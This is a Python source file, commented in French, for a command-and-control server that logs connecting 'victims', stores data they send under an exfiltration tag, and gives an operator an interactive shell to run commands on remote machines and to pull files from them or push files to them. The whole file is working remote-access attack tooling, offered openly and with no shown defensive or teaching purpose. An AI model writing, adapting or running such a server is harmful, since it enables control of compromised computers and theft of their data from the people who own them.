import socket
import time

def logger_master(message):
    horodatage = time.strftime('%Y-%m-%d %H:%M:%S')
    ligne = f"[{horodatage}] {message}"
    with open("c2_master.log", "a") as f: f.write(ligne + "\n")
    print(ligne)

def demarrer_serveur():
    HOST, PORT = '0.0.0.0', 5555
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        logger_master(f"[INFO] C2 pret sur {PORT}")

        while True:
            conn, addr = s.accept()
            with conn:
                logger_master(f"[INFO] Victime : {addr[0]}")
                try:
                    data = conn.recv(1024).decode()
                    if not data: continue
                    logger_master(f"[EXFIL] {data}")
                    conn.sendall(b"OK")
                    
                    while True:
                        cmd = input(f"C2@{addr[0]}> ")
                        if not cmd: continue
                        conn.sendall(cmd.encode())
                        if cmd.lower() == "exit": break
                        
                        reponse = conn.recv(1024*1024)
                        
                        # Gestion des LOGS envoyés par le client
                        if reponse.startswith(b"LOG:"):
                            logger_master(f"[REMOTE] {reponse.decode()}")
                            # On reprend la réponse suivante si la commande attendait un retour
                            reponse = conn.recv(1024*1024)

                        if cmd.startswith("UPLOAD "):
                            nom = "recup_" + cmd.split(" ")[1].split("/")[-1]
                            with open(nom, "wb") as f: f.write(reponse)
                            logger_master(f"[INFO] Fichier sauve : {nom}")
                        
                        elif cmd.startswith("DOWNLOAD "):
                            if reponse == b"READY_TO_RECEIVE":
                                local_f = input("Veuillez nous fournir le chemin du dossier a envoyer: ")
                                with open(local_f, "rb") as f: conn.sendall(f.read())
                                logger_master(f"[INFO] Envoi de {local_f} reussi.")
                        else:
                            print(reponse.decode(errors='ignore'))
                            
                except Exception as e:
                    logger_master(f"[ERROR] {e}")

if __name__ == "__main__":
    demarrer_serveur()